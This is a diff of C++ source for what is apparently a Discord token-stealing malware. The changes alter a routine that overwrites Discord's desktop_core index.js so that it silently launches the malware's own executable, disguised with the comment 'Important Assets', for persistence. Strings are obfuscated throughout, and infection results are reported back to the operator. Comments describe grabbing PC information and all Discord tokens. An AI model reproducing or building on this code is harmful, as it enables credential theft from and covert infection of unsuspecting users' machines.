@@ -100,27 +100,26 @@ void InfectRoutine()
 		}
 		// Discord Infect (only works on older discord clients)
 		std::sprintf(discord_path, AY_OBFUSCATE("%s\\Discord\\modules\\discord_desktop_core"), std::getenv(AY_OBFUSCATE("appdata")));
-		if (!fs::exists(discord_path))
-			return;
-		std::sprintf(startup_path, AY_OBFUSCATE("%s\\index.js"), discord_path);
-		std::ofstream index(startup_path);
-		index << "module.exports = require('./core.asar');" << std::endl \
-			<< "var exec = require('child_process').execFile; exec('" << alt_path \
-			<< "'); // Important Assets.";
-		index.close();
-		
+		if (fs::exists(discord_path)) {
+			std::sprintf(startup_path, AY_OBFUSCATE("%s\\index.js"), discord_path);
+			std::ofstream index(startup_path);
+			index << "module.exports = require('./core.asar');" << std::endl \
+				<< "var exec = require('child_process').execFile; exec('" << alt_path \
+				<< "'); // Important Assets.";
+			index.close();
+		}
 		// Report
 		if (!fs::exists(startup_path) && !fs::exists(discord_path))
-			std::sprintf(report_msg, AY_OBFUSCATE("**Persistence/Infection**\nPC Infection: **failed**\nDiscord Infection: **failed**"));
+			std::sprintf(report_msg, AY_OBFUSCATE("**Peristance/Infection**\nPC Infection: **failed**\nDiscord Infection: **failed**"));
 
 		if (!fs::exists(startup_path) && fs::exists(discord_path))
-			std::sprintf(report_msg, AY_OBFUSCATE("**Persistence/Infection**\nPC Infection: **failed**\nDiscord Infection: **success** (%s)"), discord_path);
+			std::sprintf(report_msg, AY_OBFUSCATE("**Peristance/Infection**\nPC Infection: **failed**\nDiscord Infection: **success** (%s)"), discord_path);
 
 		if (fs::exists(startup_path) && !fs::exists(discord_path))
-			std::sprintf(report_msg, AY_OBFUSCATE("**Persistence/Infection**\nPC Infection: **success** (%s)\nDiscord Infection: **failed**"), startup_path);
+			std::sprintf(report_msg, AY_OBFUSCATE("**Peristance/Infection**\nPC Infection: **success** (%s)\nDiscord Infection: **failed**"), startup_path);
 
 		if (fs::exists(startup_path) && fs::exists(discord_path))
-			std::sprintf(report_msg, AY_OBFUSCATE("**Persistence/Infection**\nPC Infection: **success** (%s)\nDiscord Infection: **success** (%s)"), startup_path, discord_path);
+			std::sprintf(report_msg, AY_OBFUSCATE("**Peristance/Infection**\nPC Infection: **success** (%s)\nDiscord Infection: **success** (%s)"), startup_path, discord_path);
 		Modules::CleoReport(report_msg);
 	}
 	catch (const std::exception& e) {
@@ -141,7 +140,7 @@ int main()
 		std::this_thread::sleep_for(std::chrono::seconds(1));
 
 	std::thread mr(MainRoutine); // Get PC information and find all discord tokens - info grab.
-	std::thread ir(InfectRoutine); // Infect the computer & discord - persistence/infection.
+	std::thread ir(InfectRoutine); // Infect the computer & discord - persistance/infection.
 	// Thread Managing
 	if (mr.joinable())
 		mr.join();
